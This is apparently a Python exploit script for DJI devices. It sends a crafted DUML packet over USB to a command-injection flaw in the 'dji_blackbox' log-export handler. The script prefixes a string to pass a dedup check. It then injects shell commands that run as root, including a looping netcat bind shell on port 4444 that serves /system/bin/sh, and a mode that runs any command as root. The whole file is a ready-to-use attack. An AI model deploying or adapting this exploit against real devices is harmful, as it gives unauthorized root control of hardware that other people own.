"""spawn_shell.py - start (or drive) the root shell via the dji_blackbox
external log-export RCE.

Wire: dst=0x5D, cmd_set=0x19, cmd_id=0x31
      payload = 01 02 00 <len> <shell string> 00

Usage:
    py -3.12 spawn_shell.py                 # start persistent listener on :4444
    py -3.12 spawn_shell.py --stop          # kill the listener
    py -3.12 spawn_shell.py --cmd "id"      # run one root command (reply only)

The command runs as uid 0 in SELinux domain u:r:dji_services:s0.
"""
import sys
import os
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import n3_file as N

DST = 0x5D
CS = 0x19
CID = 0x31
PREFIX = 'foo'          # satisfies the handler's dedup strncmp

SHELL_CMD = (
    PREFIX + ';(for b in /system/xbin/busybox /system/bin/busybox '
    '/system/bin/toybox; do while [ -x $b ]; do '
    '$b nc -l -p 4444 -e /system/bin/sh; sleep 1; done; done &)'
)

STOP_CMD = PREFIX + ";pkill -f 'nc -l -p 4444'"


def build(path):
    b = path.encode()
    if not b:
        raise SystemExit('empty command')
    if len(b) > 0xFF:
        raise SystemExit('command too long (%d > 255)' % len(b))
    return bytes([0x01, 0x02, 0x00, len(b)]) + b + b'\x00'


def send(path, wait_ms=2000, full_init=False):
    d = N.Duml()
    d.open()
    try:
        d.drain(200)
        if full_init:
            d.full_init()
        f = N.pkt(0x0A, DST, 0x9000, CS, CID, build(path), 0x40)
        rc = d.lib.dll.usb_bulk_write(d.h, d.eo, f, len(f), 800)
        out = []

        def on(fr):
            b = N.body_of(fr)
            if not b or len(b) < 7:
                return
            if b[5] == CS and b[6] == CID:
                out.append((b[4], b[7:]))
        d.drain(wait_ms, on)
        return rc, out
    finally:
        d.close()


def main():
    a = sys.argv[1:]
    if a and a[0] in ('--stop', 'stop'):
        rc, out = send(STOP_CMD)
        print('stop ->', ' | '.join('ack=%02x %s' % (x, p[:40].hex()) for x, p in out) or 'no reply')
        return
    if a and a[0] in ('--cmd', 'cmd'):
        if len(a) < 2:
            raise SystemExit('usage: spawn_shell.py --cmd "<shell command>"')
        path = PREFIX + ';' + a[1]
        rc, out = send(path)
        print('cmd ->', ' | '.join('ack=%02x %s' % (x, p[:80].hex()) for x, p in out) or 'no reply')
        return

    # kill any previous listener first so we don't end up with two
    # competing `while true; nc -l` loops spinning on the same port
    send(STOP_CMD, wait_ms=1000)
    time.sleep(0.6)
    rc, out = send(SHELL_CMD)
    print('spawn ->', ' | '.join('ack=%02x %s' % (x, p[:40].hex()) for x, p in out) or 'no reply')
    print('[*] now run:  py -3.12 root_shell.py   (or: nc 192.168.60.2 4444)')


if __name__ == '__main__':
    main()
